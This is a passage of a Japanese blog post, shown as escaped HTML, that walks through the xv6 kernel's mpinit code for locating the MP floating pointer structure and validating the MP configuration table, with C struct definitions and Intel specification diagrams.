  &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0xF0000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x10000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;前述した通り、MPフローティングポインタ構造体が存在する場合は、以下のいずれかに配置されています。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;拡張BIOSデータ領域（EBDA）の最初の1KiB以内の領域&lt;/li&gt;
&lt;li&gt;システムベースメモリ領域の最後の1KiB以内の範囲&lt;/li&gt;
&lt;li&gt;&lt;code class=&quot;language-text&quot;&gt;0x0F0000&lt;/code&gt;から&lt;code class=&quot;language-text&quot;&gt;0x0FFFFFF&lt;/code&gt;の間のBIOS ROMアドレス空間&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;これらの領域を検索してMPフローティングポインタ構造体が見つかった場合は&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;に格納されます。&lt;/p&gt;
&lt;p&gt;このとき、MPフローティングポインタ構造体が見つからない場合、もしくはMPフローティングポインタ構造体が持つMPコンフィグレーションテーブルのアドレスが空の場合はカーネルを終了します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;mp &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpsearch&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;||&lt;/span&gt; mp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;physaddr &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;MPフローティングポインタ構造体は以下の構造になっています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mp&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;             &lt;span class=&quot;token comment&quot;&gt;// floating pointer&lt;/span&gt;
  uchar signature&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// &quot;_MP_&quot;&lt;/span&gt;
  &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;physaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// phys addr of MP config table&lt;/span&gt;
  uchar length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// 1&lt;/span&gt;
  uchar specrev&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// [14]&lt;/span&gt;
  uchar checksum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// all bytes must add up to 0&lt;/span&gt;
  uchar type&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                   &lt;span class=&quot;token comment&quot;&gt;// MP system config type&lt;/span&gt;
  uchar imcrp&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  uchar reserved&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mp&lt;/code&gt;構造体の定義は上記ですが、Intel仕様書の図の方がイメージしやすいので一緒に貼っておきます。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 500px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/89053dbef9ccb06f6561234b34173eaa/0b533/image-30.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 56.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAARlAAAEZQAGA43XUAAABz0lEQVQoz01S2W7CQAzM/38TfQKJW4irhQINOYCEcARCQkiAqcewVVeyNvHaY4/HVhiG2O/3OBwOap7ngj5+n89nHI9HbLdbxHGsPsYGQYBot/vLiaJIYhMkSQLrdDrhdrupFUWhAJc0xf1+h23/oNPpoF5vwF+t1JfnOdIsQ/7OKcsSl8tFC/Hd4s//83g89IEnirZot9vo9XpI00x9z+dTC5sYnixLsfJ9uTNYpPU9naLRaGjyerPBUWjYtg3HcZQqi27E77mu0icr0nOWSx1PkrDDnRQqXx0SdDweYb1eazLnQjCCEpDUCLgS2juZHWNo8/lc/amMKJD7es1hsRLbJxXenAkLsJtAqvtCZTqZKJgrPt5F8Zq3OQRkp8xVQD7SjDCJADJRaXqedmr+WcTE/heFShflmzI7IzUOld9GzTAM0O/3MRwOhd5COyEAAQ0T5jOP47qJ3yJQnl8xm81U+r3MKJEg13WwWCw0mKtESiMB5jdFYUFPYry3upGIdZcNsagaRWAQK/q+p0qapeYSs7p5j+OXzyw+jUKxe5rF1inIQWSvVD7wOR7jS0Sg6tVqFYPBALVaDa1mU9eq1WqhLcve7XbUt3RczTfz/wUC5z2KzlmzsAAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/89053dbef9ccb06f6561234b34173eaa/8ac56/image-30.webp 240w,
/static/89053dbef9ccb06f6561234b34173eaa/d3be9/image-30.webp 480w,
/static/89053dbef9ccb06f6561234b34173eaa/b0a15/image-30.webp 500w&quot;
              sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/89053dbef9ccb06f6561234b34173eaa/8ff5a/image-30.png 240w,
/static/89053dbef9ccb06f6561234b34173eaa/e85cb/image-30.png 480w,
/static/89053dbef9ccb06f6561234b34173eaa/0b533/image-30.png 500w&quot;
            sizes=&quot;(max-width: 500px) 100vw, 500px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/89053dbef9ccb06f6561234b34173eaa/0b533/image-30.png&quot;
            alt=&quot;2022/01/image-30.png&quot;
            title=&quot;2022/01/image-30.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel MultiProcessor Specification  | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最初の4バイトの&lt;code class=&quot;language-text&quot;&gt;SIGNATURE&lt;/code&gt;には&lt;code class=&quot;language-text&quot;&gt;_MP_&lt;/code&gt;が格納されていることが期待されます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;mpsearch&lt;/code&gt;関数と&lt;code class=&quot;language-text&quot;&gt;mpsearch1&lt;/code&gt;関数で探索を行う場合には、この&lt;code class=&quot;language-text&quot;&gt;SIGNATURE&lt;/code&gt;を探索しています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;physaddr&lt;/code&gt;にはMPコンフィグレーションテーブルのアドレスが格納されており、ここからはこの情報を元にMPコンフィグレーションテーブルを取得していきます。&lt;/p&gt;
&lt;h3 id=&quot;mpコンフィグレーションテーブルの取得&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#mp%E3%82%B3%E3%83%B3%E3%83%95%E3%82%A3%E3%82%B0%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%83%86%E3%83%BC%E3%83%96%E3%83%AB%E3%81%AE%E5%8F%96%E5%BE%97&quot; aria-label=&quot;mpコンフィグレーションテーブルの取得 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;MPコンフィグレーションテーブルの取得&lt;/h3&gt;
&lt;p&gt;MPフローティングポインタ構造体を取得したら、MPコンフィグレーションテーブルの仮想アドレスを取得し、&lt;code class=&quot;language-text&quot;&gt;mpconf&lt;/code&gt;構造のポインタ変数&lt;code class=&quot;language-text&quot;&gt;conf&lt;/code&gt;として格納します。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
conf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;P2V&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uint&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; mp&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;physaddr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;PCMP&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;version &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;version &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;MPコンフィグレーションテーブルは以下の構造になっています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;mpconf&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;         &lt;span class=&quot;token comment&quot;&gt;// configuration table header&lt;/span&gt;
  uchar signature&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;           &lt;span class=&quot;token comment&quot;&gt;// &quot;PCMP&quot;&lt;/span&gt;
  ushort length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// total table length&lt;/span&gt;
  uchar version&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                &lt;span class=&quot;token comment&quot;&gt;// [14]&lt;/span&gt;
  uchar checksum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// all bytes must add up to 0&lt;/span&gt;
  uchar product&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;            &lt;span class=&quot;token comment&quot;&gt;// product id&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;oemtable&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// OEM table pointer&lt;/span&gt;
  ushort oemlength&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;             &lt;span class=&quot;token comment&quot;&gt;// OEM table length&lt;/span&gt;
  ushort entry&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;token comment&quot;&gt;// entry count&lt;/span&gt;
  uint &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;lapicaddr&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;token comment&quot;&gt;// address of local APIC&lt;/span&gt;
  ushort xlength&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;               &lt;span class=&quot;token comment&quot;&gt;// extended table length&lt;/span&gt;
  uchar xchecksum&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;              &lt;span class=&quot;token comment&quot;&gt;// extended table checksum&lt;/span&gt;
  uchar reserved&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;以下はIntel仕様書から引用した構造図です。&lt;/p&gt;
&lt;p&gt;&lt;span
      class=&quot;gatsby-resp-image-wrapper&quot;
      style=&quot;position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 476px; &quot;
    &gt;
      &lt;a
    class=&quot;gatsby-resp-image-link&quot;
    href=&quot;/static/6dd866aa292a4e75103c8b5ea32eaf83/f2205/image-31.png&quot;
    style=&quot;display: block&quot;
    target=&quot;_blank&quot;
    rel=&quot;noopener&quot;
  &gt;
    &lt;span
    class=&quot;gatsby-resp-image-background-image&quot;
    style=&quot;padding-bottom: 126.25%; position: relative; bottom: 0; left: 0; background-image: url(&apos;data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAZCAYAAAAxFw7TAAAACXBIWXMAARlAAAEZQAGA43XUAAADeUlEQVQ4y2WV6XLaUAyF/f7Pkb5HM9P+SiYEwr4vjrENBAibAYOqTyCnae/MnbtpOTqS5WA2m8lisZD9fm/z/f1dBoOh3THTJNHzQD4+Puw9yzLdL2S9Xtv5cDjYebVaS57nEmy2W+l02vL09CSlUknG47Gslkv5/euXPDz8kFa7LbvdTjabjfS6XanX69Lv96Wr++FwKO1W297SJJY0nUmwWq0MQaPRkLYqp2kqW3VSLr/Kz8dH6fV6hiLTmShaIiAq9lEUyWQyEWx4lAHK5/NZfLRaLUOBdxyB2Jx1OmYsiqZmhL2Py+Vq1MznCwk+Pz+FSVhH5QfPTJCGYWgoMMo+jmO7Z87nc+MTPUCBkHMATEfohtI0MQUfhMzI87PxB8LRaGh7EmG6OFMqAgjFy+l0MjRhiPDIQjqrMM6QYT0ejwVCd344ZEWmDSFw2WDwer0WqPDcaNSleU8W2X57e5ODyjKQvVwupoezOJ5a2IZwqwj9EQfGp6Ihe2QU7qBgqeWEc2hC7qSGcMyZOkUn8GT0el0NI72jPZsBCpyBIwaZR5EzctNppHp9M4wdhiHc3wsXTzzAyW63ldLLizSbDSOfUnp+fi7ePRL0/GwGPSGDQd+yBB9M7kDJilKWHc1Afk8Uk8wSRZ5fviPk8IVsZ0jhw5OFDCt3TOfQI/JzgRCvXCDsWWOlATBQ0LzKWpN0PJ5M/mgOsgJZrHxG0+n3LwVFMsv5bxRk1873aHhHziMjAnduXwoeqXzqiD01tlotrTFw3llZ5bcC17OXGKvL36KQG0LPGBxuNl97ipVibt8bBmWFIUcFx8hhjPN/WZ79k2UQM5C5Xi8WqhczXMLh591QOBnr5xopQr2ADyY8ULiszgsr5UMU7DHKPZM9DZo39KEgyDSzE7VOaK/asaNpbKHUanWp6l2iDcC7EZzWqlWp6uxofyyXy9bWDKE2FZpLweFFifXyYbLP1VBXFSuVijUISoUWZh1cneIIVMgvlx92Dnik/vhfhOG7CZA16gokIKBN0SBAFcdJkd2p1l2z2bSOHd27eTC3/0Nqj/DHBz/SDk1/wxARhCrM6n9IX6nPJEmKTmQc+qfHCge3/0ZkCnynlM5Q/y0gIIszdUIDBrnLYoywcRp4QyV+SK7WakXHhjtaVqn0IuXXkr5X7I0EEiqUvGhHonZ9/AE7OWhVjDxa3AAAAABJRU5ErkJggg==&apos;); background-size: cover; display: block;&quot;
  &gt;&lt;/span&gt;
  &lt;picture&gt;
          &lt;source
              srcset=&quot;/static/6dd866aa292a4e75103c8b5ea32eaf83/8ac56/image-31.webp 240w,
/static/6dd866aa292a4e75103c8b5ea32eaf83/cf53a/image-31.webp 476w&quot;
              sizes=&quot;(max-width: 476px) 100vw, 476px&quot;
              type=&quot;image/webp&quot;
            /&gt;
          &lt;source
            srcset=&quot;/static/6dd866aa292a4e75103c8b5ea32eaf83/8ff5a/image-31.png 240w,
/static/6dd866aa292a4e75103c8b5ea32eaf83/f2205/image-31.png 476w&quot;
            sizes=&quot;(max-width: 476px) 100vw, 476px&quot;
            type=&quot;image/png&quot;
          /&gt;
          &lt;img
            class=&quot;gatsby-resp-image-image&quot;
            src=&quot;/static/6dd866aa292a4e75103c8b5ea32eaf83/f2205/image-31.png&quot;
            alt=&quot;2022/01/image-31.png&quot;
            title=&quot;2022/01/image-31.png&quot;
            loading=&quot;lazy&quot;
            style=&quot;width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;&quot;
          /&gt;
        &lt;/picture&gt;
  &lt;/a&gt;
    &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;参考画像：&lt;a href=&quot;https://www.manualslib.com/manual/77733/Intel-Multiprocessor.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Intel MultiProcessor Specification  | ManualsLib&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;最初の4バイト分の領域に&lt;code class=&quot;language-text&quot;&gt;SIGNATURE&lt;/code&gt;が格納されていますが、これは&lt;code class=&quot;language-text&quot;&gt;PCMP&lt;/code&gt;になることが期待されます。&lt;/p&gt;
&lt;p&gt;xv6OSでは、取得したMPコンフィグレーションテーブルの確認のため、&lt;code class=&quot;language-text&quot;&gt;memcmp&lt;/code&gt;関数にて先頭4バイトが&lt;code class=&quot;language-text&quot;&gt;PCMP&lt;/code&gt;に一致するかをチェックしています。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;memcmp&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;PCMP&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;version &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;version &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;uchar&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;conf&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; conf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;また、バージョン情報が適切であるか、データサイズが実際のサイズと一致するかについてもチェックを行っています。&lt;/p&gt;
&lt;p&gt;これで&lt;code class=&quot;language-text&quot;&gt;mpinit&lt;/code&gt;関数の以下の処理が終わり、MPフローティングポインタとMPコンフィグレーションテーブルを取得することができました。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;conf &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;mpconfig&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;mp&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;panic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Expect to run on an SMP&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
